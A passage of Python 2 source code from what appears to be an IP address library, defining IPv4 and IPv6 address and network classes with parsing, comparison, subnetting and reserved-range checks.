    def __ge__(self, other):
        lt = self.__lt__(other)
        if lt is NotImplemented:
            return NotImplemented
        return not lt

    def __lt__(self, other):
        if self._version != other._version:
            raise TypeError('%s and %s are not of the same version' % (
                    str(self), str(other)))
        if not isinstance(other, _BaseIP):
            raise TypeError('%s and %s are not of the same type' % (
                    str(self), str(other)))
        if self._ip != other._ip:
            return self._ip < other._ip
        return False

    def __gt__(self, other):
        if self._version != other._version:
            raise TypeError('%s and %s are not of the same version' % (
                    str(self), str(other)))
        if not isinstance(other, _BaseIP):
            raise TypeError('%s and %s are not of the same type' % (
                    str(self), str(other)))
        if self._ip != other._ip:
            return self._ip > other._ip
        return False

    # Shorthand for Integer addition and subtraction. This is not
    # meant to ever support addition/subtraction of addresses.
    def __add__(self, other):
        if not isinstance(other, int):
            return NotImplemented
        return IPAddress(int(self) + other, version=self._version)

    def __sub__(self, other):
        if not isinstance(other, int):
            return NotImplemented
        return IPAddress(int(self) - other, version=self._version)

    def __repr__(self):
        return '%s(%r)' % (self.__class__.__name__, str(self))

    def __str__(self):
        return  '%s' % self._string_from_ip_int(self._ip)

    def __hash__(self):
        return hash(hex(long(self._ip)))

    def _get_address_key(self):
        return (self._version, self)

    @property
    def version(self):
        raise NotImplementedError('BaseIP has no version')


class _BaseNet(_IPAddrBase):

    """A generic IP object.

    This IP class contains the version independent methods which are
    used by networks.

    """

    def __init__(self, address):
        self._cache = {}

    def __repr__(self):
        return '%s(%r)' % (self.__class__.__name__, str(self))

    def iterhosts(self):
        """Generate Iterator over usable hosts in a network.

           This is like __iter__ except it doesn't return the network
           or broadcast addresses.

        """
        cur = int(self.network) + 1
        bcast = int(self.broadcast) - 1
        while cur <= bcast:
            cur += 1
            yield IPAddress(cur - 1, version=self._version)

    def __iter__(self):
        cur = int(self.network)
        bcast = int(self.broadcast)
        while cur <= bcast:
            cur += 1
            yield IPAddress(cur - 1, version=self._version)

    def __getitem__(self, n):
        network = int(self.network)
        broadcast = int(self.broadcast)
        if n >= 0:
            if network + n > broadcast:
                raise IndexError
            return IPAddress(network + n, version=self._version)
        else:
            n += 1
            if broadcast + n < network:
                raise IndexError
            return IPAddress(broadcast + n, version=self._version)

    def __lt__(self, other):
        if self._version != other._version:
            raise TypeError('%s and %s are not of the same version' % (
                    str(self), str(other)))
        if not isinstance(other, _BaseNet):
            raise TypeError('%s and %s are not of the same type' % (
                    str(self), str(other)))
        if self.network != other.network:
            return self.network < other.network
        if self.netmask != other.netmask:
            return self.netmask < other.netmask
        return False

    def __gt__(self, other):
        if self._version != other._version:
            raise TypeError('%s and %s are not of the same version' % (
                    str(self), str(other)))
        if not isinstance(other, _BaseNet):
            raise TypeError('%s and %s are not of the same type' % (
                    str(self), str(other)))
        if self.network != other.network:
            return self.network > other.network
        if self.netmask != other.netmask:
            return self.netmask > other.netmask
        return False

    def __le__(self, other):
        gt = self.__gt__(other)
        if gt is NotImplemented:
            return NotImplemented
        return not gt

    def __ge__(self, other):
        lt = self.__lt__(other)
        if lt is NotImplemented:
            return NotImplemented
        return not lt

    def __eq__(self, other):
        try:
            return (self._version == other._version
                    and self.network == other.network
                    and int(self.netmask) == int(other.netmask))
        except AttributeError:
            if isinstance(other, _BaseIP):
                return (self._version == other._version
                        and self._ip == other._ip)

    def __ne__(self, other):
        eq = self.__eq__(other)
        if eq is NotImplemented:
            return NotImplemented
        return not eq

    def __str__(self):
        return  '%s/%s' % (str(self.ip),
                           str(self._prefixlen))

    def __hash__(self):
        return hash(int(self.network) ^ int(self.netmask))

    def __contains__(self, other):
        # always false if one is v4 and the other is v6.
        if self._version != other._version:
          return False
        # dealing with another network.
        if isinstance(other, _BaseNet):
            return (self.network <= other.network and
                    self.broadcast >= other.broadcast)
        # dealing with another address
        else:
            return (int(self.network) <= int(other._ip) <=
                    int(self.broadcast))

    def overlaps(self, other):
        """Tell if self is partly contained in other."""
        return self.network in other or self.broadcast in other or (
            other.network in self or other.broadcast in self)

    @property
    def network(self):
        x = self._cache.get('network')
        if x is None:
            x = IPAddress(self._ip & int(self.netmask), version=self._version)
            self._cache['network'] = x
        return x

    @property
    def broadcast(self):
        x = self._cache.get('broadcast')
        if x is None:
            x = IPAddress(self._ip | int(self.hostmask), version=self._version)
            self._cache['broadcast'] = x
        return x

    @property
    def hostmask(self):
        x = self._cache.get('hostmask')
        if x is None:
            x = IPAddress(int(self.netmask) ^ self._ALL_ONES,
                          version=self._version)
            self._cache['hostmask'] = x
        return x

    @property
    def with_prefixlen(self):
        return '%s/%d' % (str(self.ip), self._prefixlen)

    @property
    def with_netmask(self):
        return '%s/%s' % (str(self.ip), str(self.netmask))

    @property
    def with_hostmask(self):
        return '%s/%s' % (str(self.ip), str(self.hostmask))

    @property
    def numhosts(self):
        """Number of hosts in the current subnet."""
        return int(self.broadcast) - int(self.network) + 1

    @property
    def version(self):
        raise NotImplementedError('BaseNet has no version')

    @property
    def prefixlen(self):
        return self._prefixlen

    def address_exclude(self, other):
        """Remove an address from a larger block.

        For example:

            addr1 = IPNetwork('10.1.1.0/24')
            addr2 = IPNetwork('10.1.1.0/26')
            addr1.address_exclude(addr2) =
                [IPNetwork('10.1.1.64/26'), IPNetwork('10.1.1.128/25')]

        or IPv6:

            addr1 = IPNetwork('::1/32')
            addr2 = IPNetwork('::1/128')
            addr1.address_exclude(addr2) = [IPNetwork('::0/128'),
                IPNetwork('::2/127'),
                IPNetwork('::4/126'),
                IPNetwork('::8/125'),
                ...
                IPNetwork('0:0:8000::/33')]

        Args:
            other: An IPvXNetwork object of the same type.

        Returns:
            A sorted list of IPvXNetwork objects addresses which is self
            minus other.

        Raises:
            TypeError: If self and other are of difffering address
              versions, or if other is not a network object.
            ValueError: If other is not completely contained by self.

        """
        if not self._version == other._version:
            raise TypeError("%s and %s are not of the same version" % (
                str(self), str(other)))

        if not isinstance(other, _BaseNet):
            raise TypeError("%s is not a network object" % str(other))

        if other not in self:
            raise ValueError('%s not contained in %s' % (str(other),
                                                         str(self)))
        if other == self:
            return []

        ret_addrs = []

        # Make sure we're comparing the network of other.
        other = IPNetwork('%s/%s' % (str(other.network), str(other.prefixlen)),
                   version=other._version)

        s1, s2 = self.subnet()
        while s1 != other and s2 != other:
            if other in s1:
                ret_addrs.append(s2)
                s1, s2 = s1.subnet()
            elif other in s2:
                ret_addrs.append(s1)
                s1, s2 = s2.subnet()
            else:
                # If we got here, there's a bug somewhere.
                assert True == False, ('Error performing exclusion: '
                                       's1: %s s2: %s other: %s' %
                                       (str(s1), str(s2), str(other)))
        if s1 == other:
            ret_addrs.append(s2)
        elif s2 == other:
            ret_addrs.append(s1)
        else:
            # If we got here, there's a bug somewhere.
            assert True == False, ('Error performing exclusion: '
                                   's1: %s s2: %s other: %s' %
                                   (str(s1), str(s2), str(other)))

        return sorted(ret_addrs, key=_BaseNet._get_networks_key)

    def compare_networks(self, other):
        """Compare two IP objects.

        This is only concerned about the comparison of the integer
        representation of the network addresses.  This means that the
        host bits aren't considered at all in this method.  If you want
        to compare host bits, you can easily enough do a
        'HostA._ip < HostB._ip'

        Args:
            other: An IP object.

        Returns:
            If the IP versions of self and other are the same, returns:

            -1 if self < other:
              eg: IPv4('1.1.1.0/24') < IPv4('1.1.2.0/24')
              IPv6('1080::200C:417A') < IPv6('1080::200B:417B')
            0 if self == other
              eg: IPv4('1.1.1.1/24') == IPv4('1.1.1.2/24')
              IPv6('1080::200C:417A/96') == IPv6('1080::200C:417B/96')
            1 if self > other
              eg: IPv4('1.1.1.0/24') > IPv4('1.1.0.0/24')
              IPv6('1080::1:200C:417A/112') >
              IPv6('1080::0:200C:417A/112')

            If the IP versions of self and other are different, returns:

            -1 if self._version < other._version
              eg: IPv4('10.0.0.1/24') < IPv6('::1/128')
            1 if self._version > other._version
              eg: IPv6('::1/128') > IPv4('255.255.255.0/24')

        """
        if self._version < other._version:
            return -1
        if self._version > other._version:
            return 1
        # self._version == other._version below here:
        if self.network < other.network:
            return -1
        if self.network > other.network:
            return 1
        # self.network == other.network below here:
        if self.netmask < other.netmask:
            return -1
        if self.netmask > other.netmask:
            return 1
        # self.network == other.network and self.netmask == other.netmask
        return 0

    def _get_networks_key(self):
        """Network-only key function.

        Returns an object that identifies this address' network and
        netmask. This function is a suitable "key" argument for sorted()
        and list.sort().

        """
        return (self._version, self.network, self.netmask)

    def _ip_int_from_prefix(self, prefixlen=None):
        """Turn the prefix length netmask into a int for comparison.

        Args:
            prefixlen: An integer, the prefix length.

        Returns:
            An integer.

        """
        if not prefixlen and prefixlen != 0:
            prefixlen = self._prefixlen
        return self._ALL_ONES ^ (self._ALL_ONES >> prefixlen)

    def _prefix_from_ip_int(self, ip_int, mask=32):
        """Return prefix length from the decimal netmask.

        Args:
            ip_int: An integer, the IP address.
            mask: The netmask.  Defaults to 32.

        Returns:
            An integer, the prefix length.

        """
        while mask:
            if ip_int & 1 == 1:
                break
            ip_int >>= 1
            mask -= 1

        return mask

    def _ip_string_from_prefix(self, prefixlen=None):
        """Turn a prefix length into a dotted decimal string.

        Args:
            prefixlen: An integer, the netmask prefix length.

        Returns:
            A string, the dotted decimal netmask string.

        """
        if not prefixlen:
            prefixlen = self._prefixlen
        return self._string_from_ip_int(self._ip_int_from_prefix(prefixlen))

    def iter_subnets(self, prefixlen_diff=1, new_prefix=None):
        """The subnets which join to make the current subnet.

        In the case that self contains only one IP
        (self._prefixlen == 32 for IPv4 or self._prefixlen == 128
        for IPv6), return a list with just ourself.

        Args:
            prefixlen_diff: An integer, the amount the prefix length
              should be increased by. This should not be set if
              new_prefix is also set.
            new_prefix: The desired new prefix length. This must be a
              larger number (smaller prefix) than the existing prefix.
              This should not be set if prefixlen_diff is also set.

        Returns:
            An iterator of IPv(4|6) objects.

        Raises:
            ValueError: The prefixlen_diff is too small or too large.
                OR
            prefixlen_diff and new_prefix are both set or new_prefix
              is a smaller number than the current prefix (smaller
              number means a larger network)

        """
        if self._prefixlen == self._max_prefixlen:
            yield self
            return

        if new_prefix is not None:
            if new_prefix < self._prefixlen:
                raise ValueError('new prefix must be longer')
            if prefixlen_diff != 1:
                raise ValueError('cannot set prefixlen_diff and new_prefix')
            prefixlen_diff = new_prefix - self._prefixlen

        if prefixlen_diff < 0:
            raise ValueError('prefix length diff must be > 0')
        new_prefixlen = self._prefixlen + prefixlen_diff

        if not self._is_valid_netmask(str(new_prefixlen)):
            raise ValueError(
                'prefix length diff %d is invalid for netblock %s' % (
                    new_prefixlen, str(self)))

        first = IPNetwork('%s/%s' % (str(self.network),
                                     str(self._prefixlen + prefixlen_diff)),
                         version=self._version)

        yield first
        current = first
        while True:
            broadcast = current.broadcast
            if broadcast == self.broadcast:
                return
            new_addr = IPAddress(int(broadcast) + 1, version=self._version)
            current = IPNetwork('%s/%s' % (str(new_addr), str(new_prefixlen)),
                                version=self._version)

            yield current

    def masked(self):
        """Return the network object with the host bits masked out."""
        return IPNetwork('%s/%d' % (self.network, self._prefixlen),
                         version=self._version)

    def subnet(self, prefixlen_diff=1, new_prefix=None):
        """Return a list of subnets, rather than an iterator."""
        return list(self.iter_subnets(prefixlen_diff, new_prefix))

    def supernet(self, prefixlen_diff=1, new_prefix=None):
        """The supernet containing the current network.

        Args:
            prefixlen_diff: An integer, the amount the prefix length of
              the network should be decreased by.  For example, given a
              /24 network and a prefixlen_diff of 3, a supernet with a
              /21 netmask is returned.

        Returns:
            An IPv4 network object.

        Raises:
            ValueError: If self.prefixlen - prefixlen_diff < 0. I.e., you have a
              negative prefix length.
                OR
            If prefixlen_diff and new_prefix are both set or new_prefix is a
              larger number than the current prefix (larger number means a
              smaller network)

        """
        if self._prefixlen == 0:
            return self

        if new_prefix is not None:
            if new_prefix > self._prefixlen:
                raise ValueError('new prefix must be shorter')
            if prefixlen_diff != 1:
                raise ValueError('cannot set prefixlen_diff and new_prefix')
            prefixlen_diff = self._prefixlen - new_prefix


        if self.prefixlen - prefixlen_diff < 0:
            raise ValueError(
                'current prefixlen is %d, cannot have a prefixlen_diff of %d' %
                (self.prefixlen, prefixlen_diff))
        return IPNetwork('%s/%s' % (str(self.network),
                                    str(self.prefixlen - prefixlen_diff)),
                         version=self._version)

    # backwards compatibility
    Subnet = subnet
    Supernet = supernet
    AddressExclude = address_exclude
    CompareNetworks = compare_networks
    Contains = __contains__


class _BaseV4(object):

    """Base IPv4 object.

    The following methods are used by IPv4 objects in both single IP
    addresses and networks.

    """

    # Equivalent to 255.255.255.255 or 32 bits of 1's.
    _ALL_ONES = (2**IPV4LENGTH) - 1
    _DECIMAL_DIGITS = frozenset('0123456789')

    def __init__(self, address):
        self._version = 4
        self._max_prefixlen = IPV4LENGTH

    def _explode_shorthand_ip_string(self):
        return str(self)

    def _ip_int_from_string(self, ip_str):
        """Turn the given IP string into an integer for comparison.

        Args:
            ip_str: A string, the IP ip_str.

        Returns:
            The IP ip_str as an integer.

        Raises:
            AddressValueError: if ip_str isn't a valid IPv4 Address.

        """
        octets = ip_str.split('.')
        if len(octets) != 4:
            raise AddressValueError(ip_str)

        packed_ip = 0
        for oc in octets:
            try:
                packed_ip = (packed_ip << 8) | self._parse_octet(oc)
            except ValueError:
                raise AddressValueError(ip_str)
        return packed_ip

    def _parse_octet(self, octet_str):
        """Convert a decimal octet into an integer.

        Args:
            octet_str: A string, the number to parse.

        Returns:
            The octet as an integer.

        Raises:
            ValueError: if the octet isn't strictly a decimal from [0..255].

        """
        # Whitelist the characters, since int() allows a lot of bizarre stuff.
        if not self._DECIMAL_DIGITS.issuperset(octet_str):
            raise ValueError
        octet_int = int(octet_str, 10)
        # Disallow leading zeroes, because no clear standard exists on
        # whether these should be interpreted as decimal or octal.
        if octet_int > 255 or (octet_str[0] == '0' and len(octet_str) > 1):
            raise ValueError
        return octet_int

    def _string_from_ip_int(self, ip_int):
        """Turns a 32-bit integer into dotted decimal notation.

        Args:
            ip_int: An integer, the IP address.

        Returns:
            The IP address as a string in dotted decimal notation.

        """
        octets = []
        for _ in xrange(4):
            octets.insert(0, str(ip_int & 0xFF))
            ip_int >>= 8
        return '.'.join(octets)

    @property
    def max_prefixlen(self):
        return self._max_prefixlen

    @property
    def packed(self):
        """The binary representation of this address."""
        return v4_int_to_packed(self._ip)

    @property
    def version(self):
        return self._version

    @property
    def is_reserved(self):
       """Test if the address is otherwise IETF reserved.

        Returns:
            A boolean, True if the address is within the
            reserved IPv4 Network range.

       """
       return self in IPv4Network('240.0.0.0/4')

    @property
    def is_private(self):
        """Test if this address is allocated for private networks.

        Returns:
            A boolean, True if the address is reserved per RFC 1918.

        """
        return (self in IPv4Network('10.0.0.0/8') or
                self in IPv4Network('172.16.0.0/12') or
                self in IPv4Network('192.168.0.0/16'))

    @property
    def is_multicast(self):
        """Test if the address is reserved for multicast use.

        Returns:
            A boolean, True if the address is multicast.
            See RFC 3171 for details.

        """
        return self in IPv4Network('224.0.0.0/4')

    @property
    def is_unspecified(self):
        """Test if the address is unspecified.

        Returns:
            A boolean, True if this is the unspecified address as defined in
            RFC 5735 3.

        """
        return self in IPv4Network('0.0.0.0')

    @property
    def is_loopback(self):
        """Test if the address is a loopback address.

        Returns:
            A boolean, True if the address is a loopback per RFC 3330.

        """
        return self in IPv4Network('127.0.0.0/8')

    @property
    def is_link_local(self):
        """Test if the address is reserved for link-local.

        Returns:
            A boolean, True if the address is link-local per RFC 3927.

        """
        return self in IPv4Network('169.254.0.0/16')


class IPv4Address(_BaseV4, _BaseIP):

    """Represent and manipulate single IPv4 Addresses."""

    def __init__(self, address):

        """
        Args:
            address: A string or integer representing the IP
              '192.168.1.1'

              Additionally, an integer can be passed, so
              IPv4Address('192.168.1.1') == IPv4Address(3232235777).
              or, more generally
              IPv4Address(int(IPv4Address('192.168.1.1'))) ==
                IPv4Address('192.168.1.1')

        Raises:
            AddressValueError: If ipaddr isn't a valid IPv4 address.

        """
        _BaseV4.__init__(self, address)

        # Efficient constructor from integer.
        if isinstance(address, (int, long)):
            self._ip = address
            if address < 0 or address > self._ALL_ONES:
                raise AddressValueError(address)
            return

        # Constructing from a packed address
        if isinstance(address, Bytes):
            try:
                self._ip, = struct.unpack('!I', address)
            except struct.error:
                raise AddressValueError(address)  # Wrong length.
            return

        # Assume input argument to be string or any object representation
        # which converts into a formatted IP string.
        addr_str = str(address)
        self._ip = self._ip_int_from_string(addr_str)


class IPv4Network(_BaseV4, _BaseNet):

    """This class represents and manipulates 32-bit IPv4 networks.

    Attributes: [examples for IPv4Network('1.2.3.4/27')]
        ._ip: 16909060
        .ip: IPv4Address('1.2.3.4')
        .network: IPv4Address('1.2.3.0')
        .hostmask: IPv4Address('0.0.0.31')
        .broadcast: IPv4Address('1.2.3.31')
        .netmask: IPv4Address('255.255.255.224')
        .prefixlen: 27

    """

    # the valid octets for host and netmasks. only useful for IPv4.
    _valid_mask_octets = set((255, 254, 252, 248, 240, 224, 192, 128, 0))

    def __init__(self, address, strict=False):
        """Instantiate a new IPv4 network object.

        Args:
            address: A string or integer representing the IP [& network].
              '192.168.1.1/24'
              '192.168.1.1/255.255.255.0'
              '192.168.1.1/0.0.0.255'
              are all functionally the same in IPv4. Similarly,
              '192.168.1.1'
              '192.168.1.1/255.255.255.255'
              '192.168.1.1/32'
              are also functionaly equivalent. That is to say, failing to
              provide a subnetmask will create an object with a mask of /32.

              If the mask (portion after the / in the argument) is given in
              dotted quad form, it is treated as a netmask if it starts with a
              non-zero field (e.g. /255.0.0.0 == /8) and as a hostmask if it
              starts with a zero field (e.g. 0.255.255.255 == /8), with the
              single exception of an all-zero mask which is treated as a
              netmask == /0. If no mask is given, a default of /32 is used.

              Additionally, an integer can be passed, so
              IPv4Network('192.168.1.1') == IPv4Network(3232235777).
              or, more generally
              IPv4Network(int(IPv4Network('192.168.1.1'))) ==
                IPv4Network('192.168.1.1')

            strict: A boolean. If true, ensure that we have been passed
              A true network address, eg, 192.168.1.0/24 and not an
              IP address on a network, eg, 192.168.1.1/24.

        Raises:
            AddressValueError: If ipaddr isn't a valid IPv4 address.
            NetmaskValueError: If the netmask isn't valid for
              an IPv4 address.
            ValueError: If strict was True and a network address was not
              supplied.

        """
        _BaseNet.__init__(self, address)
        _BaseV4.__init__(self, address)

        # Constructing from an integer or packed bytes.
        if isinstance(address, (int, long, Bytes)):
            self.ip = IPv4Address(address)
            self._ip = self.ip._ip
            self._prefixlen = self._max_prefixlen
            self.netmask = IPv4Address(self._ALL_ONES)
            return

        # Assume input argument to be string or any object representation
        # which converts into a formatted IP prefix string.
        addr = str(address).split('/')

        if len(addr) > 2:
            raise AddressValueError(address)

        self._ip = self._ip_int_from_string(addr[0])
        self.ip = IPv4Address(self._ip)

        if len(addr) == 2:
            mask = addr[1].split('.')
            if len(mask) == 4:
                # We have dotted decimal netmask.
                if self._is_valid_netmask(addr[1]):
                    self.netmask = IPv4Address(self._ip_int_from_string(
                            addr[1]))
                elif self._is_hostmask(addr[1]):
                    self.netmask = IPv4Address(
                        self._ip_int_from_string(addr[1]) ^ self._ALL_ONES)
                else:
                    raise NetmaskValueError('%s is not a valid netmask'
                                                     % addr[1])

                self._prefixlen = self._prefix_from_ip_int(int(self.netmask))
            else:
                # We have a netmask in prefix length form.
                if not self._is_valid_netmask(addr[1]):
                    raise NetmaskValueError(addr[1])
                self._prefixlen = int(addr[1])
                self.netmask = IPv4Address(self._ip_int_from_prefix(
                    self._prefixlen))
        else:
            self._prefixlen = self._max_prefixlen
            self.netmask = IPv4Address(self._ip_int_from_prefix(
                self._prefixlen))
        if strict:
            if self.ip != self.network:
                raise ValueError('%s has host bits set' %
                                 self.ip)
        if self._prefixlen == (self._max_prefixlen - 1):
            self.iterhosts = self.__iter__

    def _is_hostmask(self, ip_str):
        """Test if the IP string is a hostmask (rather than a netmask).

        Args:
            ip_str: A string, the potential hostmask.

        Returns:
            A boolean, True if the IP string is a hostmask.

        """
        bits = ip_str.split('.')
        try:
            parts = [int(x) for x in bits if int(x) in self._valid_mask_octets]
        except ValueError:
            return False
        if len(parts) != len(bits):
            return False
        if parts[0] < parts[-1]:
            return True
        return False

    def _is_valid_netmask(self, netmask):
        """Verify that the netmask is valid.

        Args:
            netmask: A string, either a prefix or dotted decimal
              netmask.

        Returns:
            A boolean, True if the prefix represents a valid IPv4
            netmask.

        """
        mask = netmask.split('.')
        if len(mask) == 4:
            if [x for x in mask if int(x) not in self._valid_mask_octets]:
                return False
            if [y for idx, y in enumerate(mask) if idx > 0 and
                y > mask[idx - 1]]:
                return False
            return True
        try:
            netmask = int(netmask)
        except ValueError:
            return False
        return 0 <= netmask <= self._max_prefixlen

    # backwards compatibility
    IsRFC1918 = lambda self: self.is_private
    IsMulticast = lambda self: self.is_multicast
    IsLoopback = lambda self: self.is_loopback
    IsLinkLocal = lambda self: self.is_link_local


class _BaseV6(object):

    """Base IPv6 object.

    The following methods are used by IPv6 objects in both single IP
    addresses and networks.

    """

    _ALL_ONES = (2**IPV6LENGTH) - 1
    _HEXTET_COUNT = 8
    _HEX_DIGITS = frozenset('0123456789ABCDEFabcdef')

    def __init__(self, address):
        self._version = 6
        self._max_prefixlen = IPV6LENGTH

    def _ip_int_from_string(self, ip_str):
        """Turn an IPv6 ip_str into an integer.

        Args:
            ip_str: A string, the IPv6 ip_str.

        Returns:
            A long, the IPv6 ip_str.

        Raises:
            AddressValueError: if ip_str isn't a valid IPv6 Address.

        """
        parts = ip_str.split(':')

        # An IPv6 address needs at least 2 colons (3 parts).
        if len(parts) < 3:
            raise AddressValueError(ip_str)

        # If the address has an IPv4-style suffix, convert it to hexadecimal.
        if '.' in parts[-1]:
            ipv4_int = IPv4Address(parts.pop())._ip
            parts.append('%x' % ((ipv4_int >> 16) & 0xFFFF))
            parts.append('%x' % (ipv4_int & 0xFFFF))

        # An IPv6 address can't have more than 8 colons (9 parts).
        if len(parts) > self._HEXTET_COUNT + 1:
            raise AddressValueError(ip_str)

        # Disregarding the endpoints, find '::' with nothing in between.
        # This indicates that a run of zeroes has been skipped.
        try:
            skip_index, = (
                [i for i in xrange(1, len(parts) - 1) if not parts[i]] or
                [None])
        except ValueError:
            # Can't have more than one '::'
            raise AddressValueError(ip_str)

        # parts_hi is the number of parts to copy from above/before the '::'
        # parts_lo is the number of parts to copy from below/after the '::'
        if skip_index is not None:
            # If we found a '::', then check if it also covers the endpoints.
            parts_hi = skip_index
            parts_lo = len(parts) - skip_index - 1
            if not parts[0]:
                parts_hi -= 1
                if parts_hi:
                    raise AddressValueError(ip_str)  # ^: requires ^::
            if not parts[-1]:
                parts_lo -= 1
                if parts_lo:
                    raise AddressValueError(ip_str)  # :$ requires ::$
            parts_skipped = self._HEXTET_COUNT - (parts_hi + parts_lo)
            if parts_skipped < 1:
                raise AddressValueError(ip_str)
        else:
            # Otherwise, allocate the entire address to parts_hi.  The endpoints
            # could still be empty, but _parse_hextet() will check for that.
            if len(parts) != self._HEXTET_COUNT:
                raise AddressValueError(ip_str)
            parts_hi = len(parts)
            parts_lo = 0
            parts_skipped = 0

        try:
            # Now, parse the hextets into a 128-bit integer.
            ip_int = 0L
            for i in xrange(parts_hi):
                ip_int <<= 16
                ip_int |= self._parse_hextet(parts[i])
            ip_int <<= 16 * parts_skipped
            for i in xrange(-parts_lo, 0):
                ip_int <<= 16
                ip_int |= self._parse_hextet(parts[i])
            return ip_int
        except ValueError:
            raise AddressValueError(ip_str)

    def _parse_hextet(self, hextet_str):
        """Convert an IPv6 hextet string into an integer.

        Args:
            hextet_str: A string, the number to parse.

        Returns:
            The hextet as an integer.

        Raises:
            ValueError: if the input isn't strictly a hex number from [0..FFFF].

        """
        # Whitelist the characters, since int() allows a lot of bizarre stuff.
        if not self._HEX_DIGITS.issuperset(hextet_str):
            raise ValueError
        hextet_int = int(hextet_str, 16)
        if hextet_int > 0xFFFF:
            raise ValueError
        return hextet_int

    def _compress_hextets(self, hextets):
        """Compresses a list of hextets.

        Compresses a list of strings, replacing the longest continuous
        sequence of "0" in the list with "" and adding empty strings at
        the beginning or at the end of the string such that subsequently
        calling ":".join(hextets) will produce the compressed version of
        the IPv6 address.

        Args:
            hextets: A list of strings, the hextets to compress.

        Returns:
            A list of strings.

        """
        best_doublecolon_start = -1
        best_doublecolon_len = 0
        doublecolon_start = -1
        doublecolon_len = 0
        for index in range(len(hextets)):
            if hextets[index] == '0':
                doublecolon_len += 1
                if doublecolon_start == -1:
                    # Start of a sequence of zeros.
                    doublecolon_start = index
                if doublecolon_len > best_doublecolon_len:
                    # This is the longest sequence of zeros so far.
                    best_doublecolon_len = doublecolon_len
                    best_doublecolon_start = doublecolon_start
            else:
                doublecolon_len = 0
                doublecolon_start = -1

        if best_doublecolon_len > 1:
            best_doublecolon_end = (best_doublecolon_start +
                                    best_doublecolon_len)
            # For zeros at the end of the address.
            if best_doublecolon_end == len(hextets):
                hextets += ['']
            hextets[best_doublecolon_start:best_doublecolon_end] = ['']
            # For zeros at the beginning of the address.
            if best_doublecolon_start == 0:
                hextets = [''] + hextets

        return hextets

    def _string_from_ip_int(self, ip_int=None):
        """Turns a 128-bit integer into hexadecimal notation.

        Args:
            ip_int: An integer, the IP address.

        Returns:
            A string, the hexadecimal representation of the address.

        Raises:
            ValueError: The address is bigger than 128 bits of all ones.

        """
        if not ip_int and ip_int != 0:
            ip_int = int(self._ip)

        if ip_int > self._ALL_ONES:
            raise ValueError('IPv6 address is too large')

        hex_str = '%032x' % ip_int
        hextets = []
        for x in range(0, 32, 4):
            hextets.append('%x' % int(hex_str[x:x+4], 16))

        hextets = self._compress_hextets(hextets)
        return ':'.join(hextets)

    def _explode_shorthand_ip_string(self):
        """Expand a shortened IPv6 address.

        Args:
            ip_str: A string, the IPv6 address.

        Returns:
            A string, the expanded IPv6 address.

        """
        if isinstance(self, _BaseNet):
            ip_str = str(self.ip)
        else:
            ip_str = str(self)

        ip_int = self._ip_int_from_string(ip_str)
        parts = []
        for i in xrange(self._HEXTET_COUNT):
            parts.append('%04x' % (ip_int & 0xFFFF))
            ip_int >>= 16
        parts.reverse()
        if isinstance(self, _BaseNet):
            return '%s/%d' % (':'.join(parts), self.prefixlen)
        return ':'.join(parts)

    @property
    def max_prefixlen(self):
        return self._max_prefixlen

    @property
    def packed(self):
        """The binary representation of this address."""
        return v6_int_to_packed(self._ip)

    @property
    def version(self):
        return self._version

    @property
    def is_multicast(self):
        """Test if the address is reserved for multicast use.

        Returns:
            A boolean, True if the address is a multicast address.
            See RFC 2373 2.7 for details.

        """
        return self in IPv6Network('ff00::/8')

    @property
    def is_reserved(self):
        """Test if the address is otherwise IETF reserved.

        Returns:
            A boolean, True if the address is within one of the
            reserved IPv6 Network ranges.

        """
        return (self in IPv6Network('::/8') or
                self in IPv6Network('100::/8') or
                self in IPv6Network('200::/7') or
                self in IPv6Network('400::/6') or
                self in IPv6Network('800::/5') or
                self in IPv6Network('1000::/4') or
                self in IPv6Network('4000::/3') or
                self in IPv6Network('6000::/3') or
                self in IPv6Network('8000::/3') or
                self in IPv6Network('A000::/3') or
                self in IPv6Network('C000::/3') or
                self in IPv6Network('E000::/4') or
                self in IPv6Network('F000::/5') or
                self in IPv6Network('F800::/6') or
                self in IPv6Network('FE00::/9'))

    @property
    def is_unspecified(self):
        """Test if the address is unspecified.

        Returns:
            A boolean, True if this is the unspecified address as defined in
            RFC 2373 2.5.2.

        """
        return self._ip == 0 and getattr(self, '_prefixlen', 128) == 128

    @property
    def is_loopback(self):
        """Test if the address is a loopback address.

        Returns:
            A boolean, True if the address is a loopback address as defined in
            RFC 2373 2.5.3.

        """
        return self._ip == 1 and getattr(self, '_prefixlen', 128) == 128

    @property
    def is_link_local(self):
        """Test if the address is reserved for link-local.

        Returns:
            A boolean, True if the address is reserved per RFC 4291.

        """
        return self in IPv6Network('fe80::/10')

    @property
    def is_site_local(self):
        """Test if the address is reserved for site-local.

        Note that the site-local address space has been deprecated by RFC 3879.
        Use is_private to test if this address is in the space of unique local
        addresses as defined by RFC 4193.

        Returns:
            A boolean, True if the address is reserved per RFC 3513 2.5.6.

        """
        return self in IPv6Network('fec0::/10')

    @property
    def is_private(self):
        """Test if this address is allocated for private networks.

        Returns:
            A boolean, True if the address is reserved per RFC 4193.

        """
        return self in IPv6Network('fc00::/7')

    @property
    def ipv4_mapped(self):
        """Return the IPv4 mapped address.

        Returns:
            If the IPv6 address is a v4 mapped address, return the
            IPv4 mapped address. Return None otherwise.

        """
        if (self._ip >> 32) != 0xFFFF:
            return None
        return IPv4Address(self._ip & 0xFFFFFFFF)

    @property
    def teredo(self):
        """Tuple of embedded teredo IPs.

        Returns:
            Tuple of the (server, client) IPs or None if the address
            doesn't appear to be a teredo address (doesn't start with
            2001::/32)

        """
        if (self._ip >> 96) != 0x20010000:
            return None
        return (IPv4Address((self._ip >> 64) & 0xFFFFFFFF),
                IPv4Address(~self._ip & 0xFFFFFFFF))

    @property
    def sixtofour(self):
        """Return the IPv4 6to4 embedded address.

        Returns:
            The IPv4 6to4-embedded address if present or None if the
            address doesn't appear to contain a 6to4 embedded address.

        """
        if (self._ip >> 112) != 0x2002:
            return None
        return IPv4Address((self._ip >> 80) & 0xFFFFFFFF)


class IPv6Address(_BaseV6, _BaseIP):

    """Represent and manipulate single IPv6 Addresses.
    """

    def __init__(self, address):
        """Instantiate a new IPv6 address object.

        Args:
            address: A string or integer representing the IP

              Additionally, an integer can be passed, so
              IPv6Address('2001:4860::') ==
                IPv6Address(42541956101370907050197289607612071936L).
              or, more generally
              IPv6Address(IPv6Address('2001:4860::')._ip) ==
                IPv6Address('2001:4860::')

        Raises:
            AddressValueError: If address isn't a valid IPv6 address.

        """
        _BaseV6.__init__(self, address)

        # Efficient constructor from integer.
        if isinstance(address, (int, long)):
            self._ip = address
            if address < 0 or address > self._ALL_ONES:
                raise AddressValueError(address)
